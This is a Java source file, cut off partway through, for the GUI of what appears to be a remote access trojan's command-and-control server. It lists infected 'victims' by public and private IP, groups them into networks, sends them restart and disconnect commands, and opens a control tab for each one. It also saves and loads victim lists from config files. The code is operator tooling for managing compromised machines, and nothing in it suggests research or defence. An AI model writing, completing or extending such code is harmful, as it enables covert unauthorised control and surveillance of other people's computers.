package araratproject;

import java.awt.Color;
import java.awt.Cursor;
import java.awt.Desktop;
import java.awt.Dimension;
import java.awt.Font;
import java.awt.Point;
import java.awt.event.MouseAdapter;
import java.awt.event.MouseEvent;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.URL;
import java.net.URLConnection;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.BorderFactory;
import javax.swing.GroupLayout;
import javax.swing.Icon;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.SwingConstants;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import javax.swing.border.BevelBorder;

/**
 * The main Interface
 *
 * @version 0.1
 * @author Andreas Demosthenous
 * @since 11/06/2020
 */
public class ServerManager extends javax.swing.JFrame {

    private final int maxNameSize = 16;
    private Network selectedNetwork;
    private Host selectedHost;
    private NetworkList networkList;
    private RenamePopup renamePopup;
    private BrowseFrame browser;

    /**
     *
     */
    public ServerManager() {

        initialiseGUI();

        networkList = new NetworkList();

        networkList.add(new Network(4));
        networkList.add(new Network(4));
        networkList.add(new Network(4));
        networkList.add(new Network(4));

    }

    /**
     *
     * @param path
     * @throws IOException
     * @throws InterruptedException
     */
    private class NetworkList extends ArrayList<Network> {

        NetworkList() {

        }

        NetworkList(String netList) throws InvalidInputException {
            if (!(netList.startsWith("----_----") && netList.trim().endsWith("----_----"))) {
                throw new InvalidInputException("Invalid configuration");
            } else {

                netList = netList.substring("----_----".length(), netList.length() - "----_----".length());

            }
            String[] networks = netList.split("Network: ");

            for (int i = 0; i < networks.length; i++) {

                Network net = new Network(0);
                String[] hosts = networks[i].split("Host: ");
                Host host = null;

                for (int k = 1; k < hosts.length; k++) {
                    String[] data = hosts[k].split("---__---");
                    String[] info = data[0].split(".-.-.-.");

                    if (info != null) {
                    }

                    String[] controlInfo = null;
                    if (data.length > 1) {
                        controlInfo = data[1].split("---_---_---");
                    }

                    if (info != null && info.length == 1 && controlInfo != null) {
                        throw new InvalidInputException("Invalid configuration");

                    }
                    if (info != null && info.length != 1 && info.length != 7) {
                        throw new InvalidInputException("Invalid configuration");
                    }
                    if (controlInfo != null && controlInfo.length != 4) {
                        throw new InvalidInputException("Invalid configuration");
                    }

                    Victim victim = null;
                    if (info.length == 7) {
                        victim = new Victim(info[0].trim(), info[1].trim(),
                                info[2].trim(), info[3].trim(), info[4].trim(),
                                info[5].trim(), info[6].trim(), null);
                    }
                    if (controlInfo != null && victim != null) {
                        Server.controller.addVictim(victim, controlInfo);
                    }

                    if (hosts[k] != null && !hosts[k].trim().equals("")) {
                        host = new Host(net, victim);
                        host.disconnect(1);
                        net.getHostList().add(host);
                    }

                }
                if (hosts[0] != null && !hosts[0].trim().equals("")) {

                    if (!hosts[0].trim().equals("Unassigned")) {
                        net.assign(hosts[0].trim());
                    }

                    net.disconnect();
                    add(net);
                }
            }
        }

        public boolean isFull() {
            return getFirstUnassigned() == null;
        }

        public Network getFirstUnassigned() {
            for (int i = 0; i < size(); i++) {
                if (!get(i).isAssigned()) {
                    return get(i);
                }
            }
            if (Server.settingsFrame.autoCapacityIncrease()) {
                Network net = new Network(4);
                add(net);
                return net;
            }
            return null;

        }

        public Network getNetworkByIP(String ip) {
            for (int i = 0; i < size(); i++) {
                if (get(i).getIP().equals(ip)) {
                    return get(i);
                }
            }
            return null;
        }

        public void connectVictim(Victim victim) {
            if (!isFull()) {
                String publicIP = victim.getPublicIP();
                Network victimNetwork = getNetworkByIP(publicIP);
                if (victimNetwork != null) {
                    if (victimNetwork.getHostList().exists(victim)) {
                        victimNetwork.getHostList().getHost(victim).reconnect();
                    } else if (!victimNetwork.getHostList().isFull()) {
                        Host victimHost = victimNetwork.getHostList().getFirstUnassigned();
                        victimHost.setVictim(victim, 1);
                    }
                } else {
                    victimNetwork = networkList.getFirstUnassigned();
                    victimNetwork.assign(publicIP);
                    if (!victimNetwork.getHostList().isFull()) {
                        Host victimHost = victimNetwork.getHostList().getFirstUnassigned();
                        victimHost.setVictim(victim, 1);

                    }
                }
            }
            refreshSelectedLabel();

        }

        public void updatePanel() {
            destroy();
            create();
        }

        private void create() {

            for (int i = 0; i < size(); i++) {
                networkPanel.add(get(i));
            }

            if ((size()) % 2 == 0) {
                networkPanel.setPreferredSize(new Dimension(270, ((size()) / 2) * (29 + 90)));
            } else {
                networkPanel.setPreferredSize(new Dimension(270, ((size()) / 2 + 1) * (29 + 90)));
            }

            networkPanel.revalidate();
            networkPanel.repaint();

        }

        private void destroy() {

            networkPanel.removeAll();
            if ((size()) % 2 == 0) {
                networkPanel.setPreferredSize(new Dimension(270, ((size()) / 2) * (29 + 90)));
            } else {
                networkPanel.setPreferredSize(new Dimension(270, ((size()) / 2 + 1) * (29 + 90)));
            }

            networkPanel.revalidate();
            networkPanel.repaint();

        }

        public void disconnectVictim(Victim victim) {
            if (victim == null) {
                return;
            }
            String publicIP = victim.getPublicIP();
            Network victimNetwork = getNetworkByIP(publicIP);
            if (victimNetwork != null) {
                Host victimHost = victimNetwork.getHostList().getHost(victim);
                if (victimHost != null) {
                    victimHost.disconnect(0);
                }

            }

        }

        public void sort() {
            boolean flag = true;
            while (flag) {
                flag = false;
                for (int i = 0; i < size() - 1; i++) {
                    if (!get(i).isConnected() && get(i + 1).isConnected()) {
                        Network temp = get(i);
                        set(i, get(i + 1));
                        set(i + 1, temp);
                        flag = true;
                    } else if (!get(i).isAssigned() && get(i + 1).isAssigned()) {
                        Network temp = get(i);
                        set(i, get(i + 1));
                        set(i + 1, temp);
                        flag = true;
                    }
                }
            }
        }

        public String toString() {
            String str = "";
            for (int i = 0; i < size(); i++) {
                str += get(i).toString();
            }
            return str;
        }

        public Network getNetwork(Network network) {
            for (int i = 0; i < size(); i++) {
                if (this.get(i).equals(network)) {
                    return get(i);
                }
            }
            return null;
        }

        public boolean containsVictim(Victim victim) {
            for (int i = 0; i < size(); i++) {
                if (get(i).getHostList().exists(victim)) {
                    return true;
                }
            }
            return false;
        }

        public void removeAll() {
            for (int i = 0; i < size(); i++) {
                get(i).getHostList().removeAll();

            }

        }

        public void restartAll() throws InterruptedException {
            appendLog(Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> Reconnecting..."
                    + "\n");

            for (int i = 0; i < size(); i++) {
                get(i).getHostList().restartAll();

            }

        }

    }

    private class Network extends JLabel {

        private HostList hostList;
        private String ip;
        private String name;
        private boolean isSelected, isAssigned;

        Network(int hostNumber) {

            this.ip = " Unassigned ";
            this.name = ip;
            this.isSelected = false;
            this.isAssigned = false;
            this.hostList = new HostList(this);

            for (int i = 0; i < hostNumber; i++) {
                hostList.add(new Host(this));
            }
            initializeNetworkComponents();

        }

        public String toString() {
            String str = "Network: " + name + "\n";

            str += hostList.toString();

            return str;
        }

        private void initializeNetworkComponents() {

            setIcon(new ImageIcon(getClass().getResource("Images/neticon.png")));
            setCursor(new Cursor(Cursor.HAND_CURSOR));
            setEnabled(false);
            setHorizontalTextPosition(SwingConstants.CENTER);
            setVerticalTextPosition(SwingConstants.BOTTOM);
            setText(name);
            setFont(new Font("Arial", Font.BOLD, 14));
            if ((networkList.size() + 1) % 2 == 0) {
                networkPanel.setPreferredSize(new Dimension(270, ((networkList.size() + 1) / 2) * (29 + this.getIcon().getIconHeight())));
            } else {
                networkPanel.setPreferredSize(new Dimension(270, ((networkList.size() + 1) / 2 + 1) * (29 + this.getIcon().getIconHeight())));
            }

            this.addMouseListener(new MouseAdapter() {

                public void mousePressed(MouseEvent e) {
                    select();
                }

                public void mouseEntered(MouseEvent e) {
                    setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.gray, Color.black));
                }

                public void mouseExited(MouseEvent e) {
                    if (!isSelected) {
                        setBorder(null);
                    }
                }

            });

            networkPanel.add(this);
            networkPanel.revalidate();

        }

        public String getNetname() {
            return name;
        }

        public void setNetname(String name) {

            appendLog(Toolset.getCurrentTime(new SimpleDateFormat("  @ dd/MM/yy  HH:mm:ss")) + " >> \"" + this.getNetname() + "\" is renamed to "
                    + "\"" + name + "\".\n");
            this.name = name;
        }

        public HostList getHostList() {
            return hostList;
        }

        public void removeHost(Host host) {
            hostList.remove(host);

        }

        public boolean isAssigned() {
            return isAssigned;
        }

        public boolean isSelected() {
            return isSelected;
        }

        public void assign(String ip) {
            isAssigned = true;
            this.ip = ip;
            this.name = ip;
            setEnabled(true);
            setText(ip);
            if (isSelected()) {
                renameNetButton.setEnabled(true);
                propertiesButton.setEnabled(true);
                selectedLabel.setEnabled(isEnabled());
                selectedLabel.setText(ip);
                refreshSelectedLabel();
            }

        }

        public void select() {

            if (selectedNetwork != null) {
                selectedNetwork.getHostList().destroy();
                selectedNetwork.unselect();
            }

            selectedNetwork = this;
            selectedLabel.setEnabled(isEnabled());
            selectedLabel.setText(ip);

            refreshSelectedLabel();

            hostList.create();
            addHostButton.setEnabled(true);
            removeNetButton.setEnabled(true);

            if (isAssigned()) {
                renameNetButton.setEnabled(true);
                propertiesButton.setEnabled(true);
            }

            isSelected = true;
            setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.gray, Color.black));

        }

        public void unselect() {
            if (isSelected()) {
                selectedNetwork.getHostList().destroy();
                isSelected = false;
                setBorder(null);
                selectedNetwork = null;
                removeHostButton.setEnabled(false);
                renameHostButton.setEnabled(false);
                controlHostButton.setEnabled(false);

                addHostButton.setEnabled(false);
                removeNetButton.setEnabled(false);
                renameNetButton.setEnabled(false);
                propertiesButton.setEnabled(false);

                selectedLabel.setEnabled(false);
                selectedLabel.setText(" Unassigned ");
                refreshSelectedLabel();
            }

        }

        public void removeNetwork() {
            networkPanel.remove(this);
            networkList.remove(this);
            networkPanel.setPreferredSize(new Dimension(270, ((getHostList().size()) / 2) * (29 + 90)));

            hostList.destroy();
            hostList.removeAll();

            addHostButton.setEnabled(false);
            unselect();

            networkList.sort();
            networkList.updatePanel();

            refreshSelectedLabel();

        }

        public String getIP() {
            return ip;
        }

        public boolean isConnected() {
            for (int i = 0; i < hostList.size(); i++) {
                if (hostList.get(i).isConnected()) {
                    return true;
                }
            }
            return false;
        }

        public void disconnect() {

            this.setEnabled(false);
            if (isSelected()) {
                selectedLabel.setEnabled(isEnabled());
                selectedLabel.setText(ip);

            }
            networkList.sort();
            networkList.updatePanel();

            refreshSelectedLabel();
        }

        public void reconnect() {
            setEnabled(true);
            if (isSelected()) {
                renameNetButton.setEnabled(true);
                selectedLabel.setEnabled(isEnabled());
                selectedLabel.setText(ip);

            }

            networkList.sort();
            networkList.updatePanel();
            refreshSelectedLabel();
        }

        public boolean equals(Object obj) {
            if (obj == null) {
                return false;
            }
            if (obj.getClass() != this.getClass()) {
                return false;
            }
            Network netObj = (Network) obj;
            return netObj.ip.equals(ip);
        }

    }

    private class HostList extends ArrayList<Host> {

        private Network network;

        HostList(Network network) {
            this.network = network;
        }

        public String toString() {
            String str = "";
            for (int i = 0; i < size(); i++) {
                str += get(i).toString() + "\n";
            }
            return str;
        }

        public void updatePanel() {
            destroy();
            create();
        }

        private void create() {

            for (int i = 0; i < size(); i++) {
                hostPanel.add(get(i));
            }

            if ((size()) % 2 == 0) {
                hostPanel.setPreferredSize(new Dimension(270, ((size()) / 2) * (29 + 87)));
            } else {
                hostPanel.setPreferredSize(new Dimension(270, ((size()) / 2 + 1) * (29 + 87)));
            }

            hostPanel.revalidate();
            hostPanel.repaint();

        }

        private void destroy() {

            hostPanel.removeAll();

            if ((size()) % 2 == 0) {
                hostPanel.setPreferredSize(new Dimension(270, ((size()) / 2) * (29 + 87)));
            } else {
                hostPanel.setPreferredSize(new Dimension(270, ((size()) / 2 + 1) * (29 + 87)));
            }
            hostPanel.repaint();
            hostPanel.revalidate();

        }

        private void disconnectAll() {
            for (int i = 0; i < size(); i++) {
                get(i).disconnect(0);
            }
        }

        private void removeAll() {

            while (!isEmpty()) {

                get(0).removeHost(0);
            }
        }

        private void restartAll() throws InterruptedException {

            while (!isEmpty()) {

                Victim victim = get(0).getVictim();
                if (victim != null && victim.getSession() != null) {
                    Thread.sleep(500);
                    victim.getSession().transmitData("RSTRT");
                    Thread.sleep(500);
                }
                get(0).removeHost(1);
            }
        }

        public int getUnassignedHostCount() {
            int cnt = 0;
            for (int i = 0; i < size(); i++) {
                if (!this.get(i).isAssigned()) {
                    cnt++;
                }
            }
            return cnt;
        }

        public int getActiveHostCount() {
            int cnt = 0;
            for (int i = 0; i < size(); i++) {
                if (this.get(i).isAssigned() && this.get(i).isConnected()) {
                    cnt++;
                }
            }
            return cnt;
        }

        public int getInactiveHostCount() {
            int cnt = 0;
            for (int i = 0; i < size(); i++) {
                if (this.get(i).isAssigned() && !this.get(i).isConnected()) {
                    cnt++;
                }
            }
            return cnt;
        }

        public Host getHost(Victim victim) {
            if (victim == null) {
                return null;
            }

            for (int i = 0; i < size(); i++) {
                if (get(i).getVictim() == null) {
                    continue;
                }
                if (get(i).getVictim().equals(victim)) {
                    return get(i);
                }
            }
            return null;
        }

        public boolean exists(Victim victim) {
            return getHost(victim) != null;
        }

        public Host getFirstUnassigned() {
            for (int i = 0; i < size(); i++) {
                if (!get(i).isAssigned()) {
                    return get(i);
                }
            }
            if (Server.settingsFrame.autoCapacityIncrease()) {
                Host host = new Host(network);
                add(host);
                return host;
            }

            return null;
        }

        public boolean isFull() {
            return getFirstUnassigned() == null;
        }

        public void sort() {
            boolean flag = true;
            while (flag) {
                flag = false;
                for (int i = 0; i < size() - 1; i++) {
                    if (!get(i).isConnected() && get(i + 1).isConnected()) {
                        Host temp = get(i);
                        set(i, get(i + 1));
                        set(i + 1, temp);
                        flag = true;
                    } else if (!get(i).isAssigned() && get(i + 1).isAssigned()) {
                        Host temp = get(i);
                        set(i, get(i + 1));
                        set(i + 1, temp);
                        flag = true;
                    }
                }
            }
        }

        public Host getHost(Host host) {
            for (int i = 0; i < size(); i++) {
                if (this.get(i).equals(host) && this.get(i).isAssigned()) {
                    return get(i);
                }
            }
            return null;
        }

    }

    private class Host extends JLabel {

        private boolean isAssigned, isSelected, isConnected;
        private Victim victim;
        private String ip, name;
        private Network network;

        public Host(Network network) {
            this(network, null);
        }

        public Host(Network network, Victim victim) {

            this.ip = " Unassigned ";
            if (victim != null) {
                this.name = victim.getName();
            } else {
                this.name = ip;
            }
            this.network = network;
            this.isSelected = false;
            this.isAssigned = false;
            this.isConnected = false;

            initializeHostComponents();
            setVictim(victim, 0);

        }

        public String toString() {

            String str = "Host: ";

            if (victim == null) {
                str += name;

            } else {
                str += victim.toString();
            }

            if (Server.controller.getTab(victim) != null) {
                str += "\n---__---" + Server.controller.getTab(victim).toString();
            }
            return str;
        }

        private void initializeHostComponents() {

            setIcon(new ImageIcon(getClass().getResource("Images/PCEnabled.png")));
            setDisabledIcon(new ImageIcon(getClass().getResource("Images/PCDisabled.png")));
            setEnabled(false);
            setCursor(new Cursor(Cursor.HAND_CURSOR));

            setHorizontalTextPosition(SwingConstants.CENTER);
            setVerticalTextPosition(SwingConstants.BOTTOM);
            setText(name);
            setFont(new Font("Arial", Font.BOLD, 14));

            this.addMouseListener(new MouseAdapter() {

                public void mousePressed(MouseEvent e) {
                    select();
                }

                public void mouseEntered(MouseEvent e) {
                    setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.gray, Color.black));

                }

                public void mouseExited(MouseEvent e) {
                    if (!isSelected) {
                        setBorder(null);
                    }
                }

            });

        }

        public void select() {
            if (selectedHost != null) {
                selectedHost.unselect();
            }
            selectedHost = Host.this;
            isSelected = true;
            setBorder(javax.swing.BorderFactory.createBevelBorder(javax.swing.border.BevelBorder.RAISED, Color.gray, Color.black));
            removeHostButton.setEnabled(true);

            if (isAssigned()) {
                renameHostButton.setEnabled(true);
                controlHostButton.setEnabled(true);
            }

        }

        public void unselect() {
            if (isSelected()) {
                isSelected = false;
                setBorder(null);
                selectedHost = null;
                removeHostButton.setEnabled(false);
                renameHostButton.setEnabled(false);
                controlHostButton.setEnabled(false);
            }

        }

        public Victim getVictim() {
            return victim;
        }

        public void setVictim(Victim victim, int type) {
            if (victim == null) {
                return;
            }
            this.victim = victim;

            this.ip = victim.getPrivateIP();
            this.name = victim.getName();

            isAssigned = true;
            setText(name);

            try {
                Thread.sleep(1);
            } catch (InterruptedException ex) {
                //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error setting the victim", JOptionPane.ERROR_MESSAGE);
            }

            if (isSelected()) {
                renameHostButton.setEnabled(true);
                controlHostButton.setEnabled(true);
            }
            if (type == 1) {
                reconnect();
            }

        }

        public boolean isAssigned() {
            return isAssigned;
        }

        public boolean isSelected() {
            return isSelected;
        }

        public void removeHost(int type) {
            hostPanel.remove(this);
            network.getHostList().remove(this);
            if (!network.isConnected()) {
                network.disconnect();
            }

            if (victim != null) {

                disconnect(type);
                if (type == 0) {
                    Server.controller.removeVictim(victim);
                    appendLog(Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> \"" + victim.getName() + "\" is removed."
                            + "\n");
                }
            }
            unselect();
            network.getHostList().sort();
            network.getHostList().updatePanel();

        }

        public boolean equals(Host host) {
            if (host == null) {
                return false;
            }

            if (host.victim == null || victim == null) {
                return false;
            }
            return (victim.equals(host.victim));
        }

        public void disconnect(int type) {

            if (!isConnected) {
                return;
            }
            setEnabled(false);
            isConnected = false;
            if (!network.isConnected()) {
                network.disconnect();
            }
            network.getHostList().sort();
            if (network.isSelected()) {
                network.getHostList().updatePanel();
            }
            if (victim != null && victim.getSession() != null) {
                victim.getSession().transmitData("DSCNT");
                victim.getSession().closeSession(true);
            }
            if (type == 0) {
                appendLog(Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> \"" + this.getHostname() + "\" is Inactive.\n");
                if (victim != null) {
                    Server.controller.getTab(victim).appendLogArea(Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss"))
                            + " >> \"" + this.getHostname() + "\" is Inactive.\n");
                }
            }

        }

        public void reconnect() {
            setEnabled(true);
            isConnected = true;
            network.reconnect();
            network.getHostList().sort();
            if (network.isSelected()) {
                network.getHostList().updatePanel();
            }

            appendLog(Toolset.getCurrentTime(new SimpleDateFormat("  +dd/MM/yy  HH:mm:ss")) + " >> \"" + this.getHostname() + "\" is Active."
                    + "\n");
            if (victim != null) {
                Server.controller.getTab(victim).appendLogArea(Toolset.getCurrentTime(new SimpleDateFormat("  +dd/MM/yy  HH:mm:ss"))
                        + " >> \"" + this.getHostname() + "\" is Active.\n");
            }

        }

        public boolean isConnected() {
            return isConnected;
        }

        public void gainControl() {
            if (victim != null) {
                Server.controller.focusVictim(victim);
                Server.controller.setVisible(true);
            }
        }

        public String getHostname() {
            return name;
        }

        public void setHostname(String name, int type) {
            if (type == 0) {
                appendLog(Toolset.getCurrentTime(new SimpleDateFormat("  @ dd/MM/yy  HH:mm:ss")) + " >> \"" + this.getHostname() + "\" is renamed to "
                        + "\"" + name + "\".\n");

                if (victim != null) {
                    Server.controller.getTab(victim).appendLogArea(Toolset.getCurrentTime(new SimpleDateFormat("  @ dd/MM/yy  HH:mm:ss"))
                            + " >> \"" + this.getHostname() + "\" is renamed to "
                            + "\"" + name + "\".\n");
                }
            }

            this.name = name;
        }

    }

    private class RenamePopup extends javax.swing.JFrame {

        private Host host;
        private Network network;

        public RenamePopup() {
            initComponents();
            setVisible(true);
            setLocation(ServerManager.this.getLocation());
            setResizable(false);

        }

        public RenamePopup(Network network) {
            this();
            this.network = network;
            renameField.setText(network.getNetname());
            renameField.selectAll();
        }

        public RenamePopup(Host host) {
            this();
            this.host = host;
            renameField.setText(host.getHostname());
            renameField.selectAll();
        }

        private void initComponents() {

            renameButton = new javax.swing.JButton();
            renameLabel = new javax.swing.JLabel();
            renameField = new javax.swing.JTextField();

            setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
            setTitle("Rename");

            renameButton.setFont(new java.awt.Font("Arial", 0, 14)); // NOI18N
            renameButton.setText("Rename");
            renameButton.addActionListener(new java.awt.event.ActionListener() {
                public void actionPerformed(java.awt.event.ActionEvent evt) {
                    renameButtonActionPerformed(evt);
                }
            });

            renameLabel.setFont(new java.awt.Font("Arial", 0, 14)); // NOI18N
            renameLabel.setText("Name: ");

            renameField.setFont(new java.awt.Font("Arial", 0, 14)); // NOI18N
            renameField.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));

            GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
            getContentPane().setLayout(layout);
            layout.setHorizontalGroup(
                    layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                    .addContainerGap()
                                    .addComponent(renameLabel)
                                    .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                    .addComponent(renameField, javax.swing.GroupLayout.PREFERRED_SIZE, 104, javax.swing.GroupLayout.PREFERRED_SIZE)
                                    .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                    .addComponent(renameButton, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                    .addContainerGap())
            );
            layout.setVerticalGroup(
                    layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, layout.createSequentialGroup()
                                    .addContainerGap()
                                    .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                            .addComponent(renameLabel)
                                            .addComponent(renameField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                                            .addComponent(renameButton))
                                    .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
            );

            pack();
        }

        private void renameButtonActionPerformed(java.awt.event.ActionEvent evt) {

            String name = renameField.getText();
            name = name.trim();
            try {
                int validation = validateName(name);
                if (validation == 1) {

                    throw new InvalidInputException(" Invalid name. Character limit is 16", renameField);

                } else if (validation == 2) {
                    throw new InvalidInputException(" Invalid name. Name can not be empty ", renameField);
                }
            } catch (InvalidInputException ex) {
                // colorises the error component
                ex.getFautyComponent().setForeground(Color.red);
                //displayes error msg
                JOptionPane.showMessageDialog(this, ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
                // sets the color back to black
                ex.getFautyComponent().setForeground(Color.black);
                return;
            }
            if (network != null) {
                network.setNetname(name);
                network.setText(name);
            }
            if (host != null) {
                host.setHostname(name, 0);
                host.setText(name);
                Server.controller.getTab(host.getVictim()).setName(name);

            }
            refreshSelectedLabel();
            dispose();
        }

        private int validateName(String name) {
            name = name.trim();
            if (name.length() > maxNameSize) {
                return 1;
            }
            if (name == null || name.equals("")) {
                return 2;
            }
            return 0;
        }

        // Variables declaration - do not modify                     
        private javax.swing.JButton renameButton;
        private javax.swing.JTextField renameField;
        private javax.swing.JLabel renameLabel;
        // End of variables declaration                   
    }

    private void initialiseGUI() {
        setIconImage(new ImageIcon(getClass().getResource("/araratproject/icons/araratIcon.png")).getImage());
        getContentPane().setBackground(Color.white);

        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | UnsupportedLookAndFeelException ex) {
            JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error setting the Look and Feel", JOptionPane.ERROR_MESSAGE);
        }

        initComponents();

        selectedLabel.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/neticon.png")));
        setVisible(true);
        stopLabel.setEnabled(false);
        stopMenu.setEnabled(false);
    }

    /**
     *
     * @param info
     */
    public void appendLog(String info) {

        logArea.append(info);

        if (Server.settingsFrame != null && Server.settingsFrame.saveSystem()) {
            try {
                Toolset.appendFile(new File(Server.settingsFrame.getSystemLogs().getPath() + "/System/logs.txt"), info);
            } catch (IOException ex) {
                JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), " Error writing data to the specified system log directory", JOptionPane.ERROR_MESSAGE);
            }
        }
    }

    /**
     * @return whether there are any unassigned networks left.
     */
    public boolean hasNetworkSpace() {
        return !networkList.isFull();
    }

    /**
     *
     * @param ip
     * @return whether there are any unassigned hosts left for the given network
     * ip.
     */
    public boolean hasHostSpace(String ip) {
        Network net = networkList.getNetworkByIP(ip);
        if (net == null) {
            return hasNetworkSpace();
        }
        return !net.getHostList().isFull();
    }

    /**
     * Connects victim to the Interface.
     *
     * @param victim
     */
    public void connectVictim(Victim victim) {
        networkList.connectVictim(victim);
    }

    /**
     * Disconnects victim from the interface
     *
     * @param victim
     */
    public void disconnectVictim(Victim victim) {
        networkList.disconnectVictim(victim);
        Server.controller.disconnectVictim(victim);
    }

    /**
     * Refreshes the selected Network label(due to some bugs occured)
     */
    public void refreshSelectedLabel() {
        if (selectedNetwork != null) {
            selectedLabel.setEnabled(selectedNetwork.isEnabled());
            selectedLabel.setText(selectedNetwork.getNetname());
        }

        selectedLabel.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        selectedLabel.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        selectedLabel.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
    }

    /**
     *
     * @param filePath
     * @throws FileNotFoundException
     * @throws IOException
     */
    public void saveCurrentState(String filePath) throws FileNotFoundException, IOException {
        FileWriter fw = new FileWriter(filePath);
        fw.write("----_----" + networkList.toString() + "----_----");
        fw.flush();
        fw.close();
    }

    public Point getCentralLocation() {
        return new Point((int) selectedLabel.getLocationOnScreen().getX() - Server.settingsFrame.getWidth() / 3, (int) selectedLabel.getLocationOnScreen().getY());
    }

    /**
     *
     * @param filePath
     */
    public void loadState(String filePath) {
        BufferedReader fr;
        try {
            fr = new BufferedReader(new FileReader(filePath));

            String str = "", line;

            while ((line = fr.readLine()) != null) {
                str += line + "\n";
            }
            NetworkList loadedList = new NetworkList(str);
            appendLog(Toolset.getCurrentTime(new SimpleDateFormat("  - dd/MM/yy  HH:mm:ss")) + " >> Loading \"" + filePath + "\"\n");

            networkList.restartAll();
            networkList = loadedList;
            networkList.sort();
            networkList.updatePanel();
            fr.close();
        } catch (FileNotFoundException ex) {
            //displayes error msg
            JOptionPane.showMessageDialog(browser, "File not found ", "Error", JOptionPane.ERROR_MESSAGE);
            return;
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(browser, ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
            return;
        } catch (InvalidInputException ex) {
            JOptionPane.showMessageDialog(browser, "Config file is corrupted", "Error", JOptionPane.ERROR_MESSAGE);
            networkList.sort();
            networkList.updatePanel();
            return;
        } catch (InterruptedException ex) {
            JOptionPane.showMessageDialog(browser, "Config file is corrupted", "Error", JOptionPane.ERROR_MESSAGE);
        }
    }

    private void stopServer() {
        startLabel.setEnabled(true);
        startMenu.setEnabled(true);
        stopLabel.setEnabled(false);
        stopMenu.setEnabled(false);
        stateLabel.setText("     State:  Stopped");
        try {
            Server.listener.stopListener();
        } catch (IOException ex) {
            //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), "Error terminating the listener", JOptionPane.ERROR_MESSAGE);
        } catch (InterruptedException ex) {
            //JOptionPane.showMessageDialog(Server.gui, ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
        }
        appendLog(Toolset.getCurrentTime(new SimpleDateFormat(" - dd/MM/yy  HH:mm:ss")) + " >> Server is stopped \n");
    }

    private void startServer() {
        try {
            if (Server.listener.startListener()) {
                startLabel.setEnabled(false);
                startMenu.setEnabled(false);
                stopLabel.setEnabled(true);
                stopMenu.setEnabled(true);
                stateLabel.setText("     State:  Running");
                appendLog(Toolset.getCurrentTime(new SimpleDateFormat(" - dd/MM/yy  HH:mm:ss")) + " >> Server is running\n Server IP: " + Server.ip
                        + "\n Port: " + Server.listener.getPort() + "\n");
            }
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(Server.gui, "Port number " + Server.listener.getPort() + " is not available.", "Error", JOptionPane.ERROR_MESSAGE);
        }
    }
    // <editor-fold defaultstate="collapsed" desc="Generated Code">//GEN-BEGIN:initComponents
    private void initComponents() {

        jLabel9 = new javax.swing.JLabel();
        CNets = new javax.swing.JLabel();
        addNetButton = new javax.swing.JLabel();
        removeNetButton = new javax.swing.JLabel();
        addHostButton = new javax.swing.JLabel();
        CNetHosts = new javax.swing.JLabel();
        removeHostButton = new javax.swing.JLabel();
        SelectedNet = new javax.swing.JLabel();
        selectedLabel = new javax.swing.JLabel();
        jScrollPane2 = new javax.swing.JScrollPane();
        logArea = new javax.swing.JTextArea();
        Nsep = new javax.swing.JSeparator();
        Nsep1 = new javax.swing.JSeparator();
        hostScroller = new javax.swing.JScrollPane();
        hostPanel = new javax.swing.JPanel();
        networkScroller = new javax.swing.JScrollPane();
        networkPanel = new javax.swing.JPanel();
        renameHostButton = new javax.swing.JLabel();
        renameNetButton = new javax.swing.JLabel();
        controlHostButton = new javax.swing.JLabel();
        propertiesButton = new javax.swing.JLabel();
        clockLabel1 = new javax.swing.JLabel();
        startLabel = new javax.swing.JLabel();
        stopLabel = new javax.swing.JLabel();
        restartLabel = new javax.swing.JLabel();
        version = new javax.swing.JLabel();
        stateLabel = new javax.swing.JLabel();
